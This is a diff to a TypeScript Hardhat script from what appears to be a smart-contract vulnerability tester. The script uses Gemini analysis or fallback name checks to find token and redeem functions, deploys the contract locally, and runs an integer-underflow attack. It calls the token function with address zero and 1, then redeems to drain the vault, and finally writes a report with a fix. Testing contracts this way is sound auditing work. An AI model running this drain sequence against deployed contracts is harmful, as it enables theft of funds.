@@ -14,16 +14,79 @@ async function main() {
   const VictimFactory = await hre.ethers.getContractFactory(fullyQualified);
   const iface = VictimFactory.interface;
 
-  // --- Check pattern BEFORE deploying ---
-  // ethers v6: getFunction() returns null if not found (does NOT throw)
+  // --- AI-powered detection via ANALYSIS_JSON ---
+  // Gemini identifies the actual token/redeem function names regardless of naming.
+  // Falls back to hardcoded "sendTokens"/"transfer" + "redeem" if absent or invalid.
   let tokenFnName: string | null = null;
-  let hasRedeem = false;
+  let redeemFnName: string | null = null;
+  let usedAiAnalysis = false;
 
-  if (iface.getFunction("sendTokens")) tokenFnName = "sendTokens";
-  else if (iface.getFunction("transfer")) tokenFnName = "transfer";
-  if (iface.getFunction("redeem")) hasRedeem = true;
+  const rawAnalysisJson = process.env.ANALYSIS_JSON;
+  if (rawAnalysisJson) {
+    try {
+      const fullAnalysis = JSON.parse(rawAnalysisJson);
+      const ov = fullAnalysis.overflow;
+      if (ov && typeof ov.found === "boolean") {
+        // support both old field names (tokenFunction) and new (tokenFn)
+        const tokenFnField  = ov.tokenFn  ?? ov.tokenFunction;
+        const redeemFnField = ov.redeemFn ?? ov.redeemFunction;
+        if (ov.found && tokenFnField && redeemFnField) {
+          // Verify both functions exist in ABI (guard against hallucination)
+          const tFn = iface.getFunction(tokenFnField);
+          const rFn = iface.getFunction(redeemFnField);
+          if (tFn !== null && rFn !== null) {
+            tokenFnName = tokenFnField;
+            redeemFnName = redeemFnField;
+            usedAiAnalysis = true;
+            console.log(`[overflow] AI analysis: tokenFn=${tokenFnName}, redeemFn=${redeemFnName}`);
+          } else {
+            console.warn(`[overflow] AI suggested ${tokenFnField}/${redeemFnField} but ABI check failed — trying fallback`);
+          }
+        } else if (!ov.found) {
+          console.log(`[overflow] Gemini: no overflow vulnerability detected`);
+          // tokenFnName stays null — will skip to "not applicable" result
+        } else {
+          throw new Error("Invalid overflow fields in ANALYSIS_JSON");
+        }
+      } else {
+        throw new Error("Missing overflow field in ANALYSIS_JSON");
+      }
+    } catch (e: any) {
+      console.warn(`[overflow] Could not parse ANALYSIS_JSON (${e.message}) — falling back to ABI detection`);
+    }
+  }
 
-  if (!tokenFnName || !hasRedeem) {
+  // Legacy fallback: check for hardcoded names
+  if (!usedAiAnalysis && tokenFnName === null) {
+    if (iface.getFunction("sendTokens")) tokenFnName = "sendTokens";
+    else if (iface.getFunction("transfer")) tokenFnName = "transfer";
+    if (iface.getFunction("redeem")) redeemFnName = "redeem";
+
+    if (tokenFnName && redeemFnName) {
+      console.log(`[overflow] Fallback ABI detection: tokenFn=${tokenFnName}, redeemFn=${redeemFnName}`);
+    }
+  }
+
+  // Validate actual ABI signatures — the overflow attack needs tokenFn(address, uint256)
+  // regardless of what AI reported. Bail out early if the real signature doesn't match.
+  if (tokenFnName && redeemFnName) {
+    const tokenFnAbi = iface.getFunction(tokenFnName);
+    const tokenSigOk =
+      tokenFnAbi !== null &&
+      tokenFnAbi.inputs.length >= 2 &&
+      tokenFnAbi.inputs[0].type === "address" &&
+      tokenFnAbi.inputs[1].type === "uint256";
+
+    if (!tokenSigOk) {
+      console.warn(
+        `[overflow] ${tokenFnName} ABI signature incompatible with underflow attack ` +
+        `(need (address,uint256), got (${tokenFnAbi?.inputs.map(i => i.type).join(",") ?? "?"})) — skipping`,
+      );
+      tokenFnName = null;
+    }
+  }
+
+  if (!tokenFnName || !redeemFnName) {
     // Pattern not applicable — deploy without value just for the result address
     const victim = await VictimFactory.deploy();
     await victim.waitForDeployment();
@@ -43,7 +106,12 @@ async function main() {
       startTime,
       endTime,
       transactions: [],
-      timeline: [`${contractName} deployed`, "No sendTokens/transfer + redeem pattern — not applicable"],
+      timeline: [
+        `${contractName} deployed`,
+        usedAiAnalysis
+          ? "Gemini: no overflow vulnerability detected"
+          : "No sendTokens/transfer + redeem pattern — not applicable",
+      ],
       report: {
         vulnerabilityType: "Integer Overflow/Underflow",
         affectedFunction: "N/A",
@@ -92,8 +160,15 @@ async function main() {
   await attackerContract.waitForDeployment();
   const attackerAddress = await attackerContract.getAddress();
 
+  // Trigger underflow: tokenFn(address(0), 1) — ABI signature already verified as (address, uint256)
   const triggerData = iface.encodeFunctionData(tokenFnName, [ZeroAddress, 1n]);
-  const extractData = iface.encodeFunctionData("redeem", [drainTokens]);
+
+  // redeemFn may take (uint256) or () — read from actual ABI
+  const redeemFnAbi = iface.getFunction(redeemFnName);
+  const extractData =
+    redeemFnAbi && redeemFnAbi.inputs.length === 0
+      ? iface.encodeFunctionData(redeemFnName, [])
+      : iface.encodeFunctionData(redeemFnName, [drainTokens]);
 
   const t1 = Date.now();
   let attackSucceeded = false;
@@ -135,7 +210,7 @@ async function main() {
           },
           {
             step: 2,
-            description: `Attacker redeems ${drainTokens} tokens → drains vault`,
+            description: `Attacker redeems ${drainTokens} tokens → drains vault via ${redeemFnName}()`,
             from: attackerAddress,
             to: victimAddress,
             value: formatEther(stolenAmount),
@@ -150,19 +225,19 @@ async function main() {
           `${contractName} deployed with 5 ETH`,
           `${tokenFnName}(address(0), 1) called with 0 tokens`,
           "Unchecked subtraction: 0 - 1 = type(uint256).max",
-          `Redeemed ${drainTokens} tokens — VULNERABLE`,
+          `Redeemed ${drainTokens} tokens via ${redeemFnName}() — VULNERABLE`,
         ]
       : [
           `${contractName} deployed`,
-          `${tokenFnName} + redeem pattern found`,
+          `${tokenFnName} + ${redeemFnName} pattern found`,
           "Attack failed — arithmetic is likely checked — SAFE",
         ],
     report: {
       vulnerabilityType: "Integer Overflow/Underflow",
       affectedFunction: `${tokenFnName}()`,
       explanation: attackSucceeded
-        ? `Unchecked subtraction in ${tokenFnName}() allows underflow. An attacker with 0 tokens subtracts 1 to get type(uint256).max, then redeems for all ETH.`
-        : `${tokenFnName} + redeem pattern found but attack failed. The contract appears to use checked arithmetic.`,
+        ? `Unchecked subtraction in ${tokenFnName}() allows underflow. An attacker with 0 tokens subtracts 1 to get type(uint256).max, then redeems via ${redeemFnName}() for all ETH.`
+        : `${tokenFnName} + ${redeemFnName} pattern found but attack failed. The contract appears to use checked arithmetic.`,
       fix: attackSucceeded
         ? "Remove the unchecked block. Solidity 0.8+ checks arithmetic by default."
         : "No fix needed — arithmetic is correctly checked.",
